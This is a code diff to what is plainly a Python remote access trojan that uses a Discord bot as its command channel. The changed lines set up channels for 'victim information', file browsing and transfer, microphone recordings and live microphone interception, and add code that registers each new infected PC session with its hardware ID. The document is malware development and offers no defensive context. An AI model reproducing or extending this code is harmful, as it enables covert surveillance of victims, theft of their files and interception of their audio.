@@ -50,16 +50,16 @@ software_directory_name = software_registry_name   # ---------------------------
 software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
 
 channel_ids = {
-    'info': 0,  # Paste here info channel ID for victim information
-    'main': 0,   # Paste here main channel ID for general output
-    'spam': 0,   # Paste here spam channel ID for filter key spamming (mostly while target play game)
-    'file': 0,   # Paste here file-related channel ID for browsing, downloading and uploading files
-    'recordings': 0,   # Paste here recording channel ID for microphone recordings storing
-    'voice': 0   # Paste here voice channel ID for realtime microphone intercepting
+    'info': None,  # Paste here info channel ID for victim information
+    'main': None,   # Paste here main channel ID for general output
+    'spam': None,   # Paste here spam channel ID for filter key spamming (mostly while target play game)
+    'file': None,   # Paste here file-related channel ID for browsing, downloading and uploading files
+    'recordings': None,   # Paste here recording channel ID for microphone recordings storing
+    'voice': None   # Paste here voice channel ID for realtime microphone intercepting
 }
 
 secret_key = ''   # Don't touch this line (just leave)
-guild_id = 0
+guild_id = None
 
 # -            End of config           - #
 # - Don't change anything below unless - #
@@ -117,12 +117,22 @@ async def on_ready():
                 else:
                     chunk += line + '\n'
             await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
+        else:
+            for channel in category.channels:
+                match channel.name:
+                    case 'info': channel_ids['info'] = channel.id
+                    case 'main': channel_ids['main'] = channel.id
+                    case 'spam': channel_ids['spam'] = channel.id
+                    case 'file': channel_ids['file'] = channel.id
+                    case 'recordings': channel_ids['recordings'] = channel.id
+                    case 'Live microphone': channel_ids['voice'] = channel.id
+            await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```')
 
 
 
 
 
-    await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```[' + current_time() + '] New PC session```')
+    await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```Starting new PC session at ' + current_time(True) + '```')
 
     recording_channel_last_message = await discord.utils.get(client.get_channel(channel_ids['recordings']).history())
 
